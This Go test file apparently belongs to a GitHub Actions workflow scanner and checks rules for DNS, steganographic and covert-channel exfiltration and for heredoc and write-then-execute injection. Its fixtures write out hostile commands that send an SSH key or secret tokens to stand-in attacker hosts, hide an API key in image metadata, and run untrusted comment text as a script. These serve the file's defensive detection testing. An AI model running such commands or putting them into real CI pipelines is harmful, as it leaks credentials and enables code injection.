/*
Copyright 2025 Hare Krishna Rai

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package rules_test

import (
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// DNS_EXFILTRATION
// ---------------------------------------------------------------------------

// The pre-existing MALICIOUS_DATA_EXFILTRATION rule only matches simple `$VAR`
// interpolation after a lookup tool, so a hostname built by command
// substitution slipped past it entirely.
func TestDNSExfiltration_CommandSubstitutionHostname(t *testing.T) {
	findings := findingsFor(t, "DNS_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: nslookup "$(cat ~/.ssh/id_rsa | base64 -w0).attacker.example.tk"
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for command-substitution DNS exfiltration, got %d", len(findings))
	}
	if findings[0].LineNumber == 0 {
		t.Error("finding should resolve to a concrete line")
	}
}

func TestDNSExfiltration_ExpressionAsSubdomain(t *testing.T) {
	findings := findingsFor(t, "DNS_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: curl "https://${{ secrets.TOKEN }}.collector.example.tk/x"
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for expression used as a subdomain, got %d", len(findings))
	}
}

func TestDNSExfiltration_OrdinaryLookupIsClean(t *testing.T) {
	findings := findingsFor(t, "DNS_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: nslookup github.com
      - run: curl -sSL https://api.github.com/repos/o/r > data.json
`)
	if len(findings) != 0 {
		t.Fatalf("ordinary DNS and HTTPS usage must not be reported, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// STEGANOGRAPHIC_EXFILTRATION
// ---------------------------------------------------------------------------

func TestSteganographicExfiltration_EmbedTool(t *testing.T) {
	findings := findingsFor(t, "STEGANOGRAPHIC_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: steghide embed -cf pic.jpg -ef secrets.txt
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for steghide embed, got %d", len(findings))
	}
}

func TestSteganographicExfiltration_MetadataWithSecret(t *testing.T) {
	findings := findingsFor(t, "STEGANOGRAPHIC_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: exiftool -Comment="${{ secrets.API_KEY }}" out.png
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for a secret written into image metadata, got %d", len(findings))
	}
}

// Reading metadata, and ordinary image processing, must not be reported.
func TestSteganographicExfiltration_BenignImageOpsAreClean(t *testing.T) {
	findings := findingsFor(t, "STEGANOGRAPHIC_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: exiftool -Comment out.png
      - run: convert input.png -resize 50% out.png
`)
	if len(findings) != 0 {
		t.Fatalf("benign image operations must not be reported, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// COVERT_CHANNEL_EXFILTRATION
// ---------------------------------------------------------------------------

func TestCovertChannel_ICMPPayload(t *testing.T) {
	findings := findingsFor(t, "COVERT_CHANNEL_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: ping -c 1 -p 4142434445 host.example.tk
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for an ICMP payload channel, got %d", len(findings))
	}
}

func TestCovertChannel_TimingFromUntrustedInput(t *testing.T) {
	findings := findingsFor(t, "COVERT_CHANNEL_EXFILTRATION", `
name: CI
on: issue_comment
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: sleep $(( ${{ github.event.comment.body }} * 2 ))
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for a timing channel, got %d", len(findings))
	}
}

func TestCovertChannel_OrdinaryCommandsAreClean(t *testing.T) {
	findings := findingsFor(t, "COVERT_CHANNEL_EXFILTRATION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: ping -c 1 github.com
      - run: sleep 30
      - run: dd if=/dev/zero of=f bs=1M count=10
`)
	if len(findings) != 0 {
		t.Fatalf("ordinary ping/sleep/dd must not be reported, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// HEREDOC_INJECTION
// ---------------------------------------------------------------------------

func TestHeredocInjection_UnquotedDelimiterExpands(t *testing.T) {
	findings := findingsFor(t, "HEREDOC_INJECTION", `
name: CI
on: issue_comment
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          cat <<EOF > /tmp/s.sh
          ${{ github.event.comment.body }}
          EOF
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for an unquoted heredoc, got %d", len(findings))
	}
	// The finding must point at the interpolated body line, not at `run:`.
	if !strings.Contains(findings[0].Evidence, "github.event.comment.body") {
		t.Errorf("evidence should be the interpolated body line, got: %q", findings[0].Evidence)
	}
}

// A quoted delimiter is the documented mitigation and must be treated as safe.
func TestHeredocInjection_QuotedDelimiterIsClean(t *testing.T) {
	findings := findingsFor(t, "HEREDOC_INJECTION", `
name: CI
on: issue_comment
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          cat <<'EOF' > /tmp/s.sh
          ${{ github.event.comment.body }}
          EOF
`)
	if len(findings) != 0 {
		t.Fatalf("a quoted heredoc disables expansion and must not be reported, got %d", len(findings))
	}
}

// An expression after the terminator is outside the heredoc body.
func TestHeredocInjection_ExpressionOutsideBodyIsClean(t *testing.T) {
	findings := findingsFor(t, "HEREDOC_INJECTION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          cat <<EOF > notes.txt
          plain text
          EOF
          echo done
`)
	if len(findings) != 0 {
		t.Fatalf("a heredoc without an interpolated body must not be reported, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// MULTI_STAGE_INJECTION
// ---------------------------------------------------------------------------

func TestMultiStageInjection_WriteThenExecuteSameFile(t *testing.T) {
	findings := findingsFor(t, "MULTI_STAGE_INJECTION", `
name: CI
on: issue_comment
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "${{ github.event.comment.body }}" > /tmp/p.sh
          bash /tmp/p.sh
`)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for write-then-execute, got %d", len(findings))
	}
}

// Writing untrusted data to a log and separately running an unrelated script is
// ordinary. Requiring the same path is what keeps this rule precise.
func TestMultiStageInjection_DifferentPathIsClean(t *testing.T) {
	findings := findingsFor(t, "MULTI_STAGE_INJECTION", `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "${{ github.event.head_commit.message }}" > /tmp/commit.log
          bash ./scripts/build.sh
`)
	if len(findings) != 0 {
		t.Fatalf("executing an unrelated script must not be reported, got %d", len(findings))
	}
}

func TestMultiStageInjection_PathNormalisation(t *testing.T) {
	// `> run.sh` then `./run.sh` refer to the same file.
	findings := findingsFor(t, "MULTI_STAGE_INJECTION", `
name: CI
on: issue_comment
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "${{ github.event.comment.body }}" > run.sh
          chmod +x run.sh
          ./run.sh
`)
	if len(findings) != 1 {
		t.Fatalf("expected path normalisation to match ./run.sh with run.sh, got %d findings", len(findings))
	}
}

// ---------------------------------------------------------------------------
// Shared scanner behaviour
// ---------------------------------------------------------------------------

// Commented-out commands must never produce findings.
func TestShellTechniques_CommentsIgnored(t *testing.T) {
	for _, id := range []string{"DNS_EXFILTRATION", "STEGANOGRAPHIC_EXFILTRATION", "COVERT_CHANNEL_EXFILTRATION"} {
		findings := findingsFor(t, id, `
name: CI
on: push
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          # nslookup "$(cat key | base64).evil.example.tk"
          # steghide embed -cf a.jpg -ef b.txt
          # ping -c 1 -p 4142434445 host.example.tk
          echo ok
`)
		if len(findings) != 0 {
			t.Errorf("%s reported a commented-out command (%d findings)", id, len(findings))
		}
	}
}

// A step matching several patterns of one technique must yield a single
// finding, not one per pattern.
func TestShellTechniques_OneFindingPerTechniquePerStep(t *testing.T) {
	findings := findingsFor(t, "COVERT_CHANNEL_EXFILTRATION", `
name: CI
on: issue_comment
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          ping -c 1 -p 4142434445 host.example.tk
          sleep $(( ${{ github.event.comment.body }} * 2 ))
`)
	if len(findings) != 1 {
		t.Fatalf("expected the technique to be reported once per step, got %d", len(findings))
	}
}
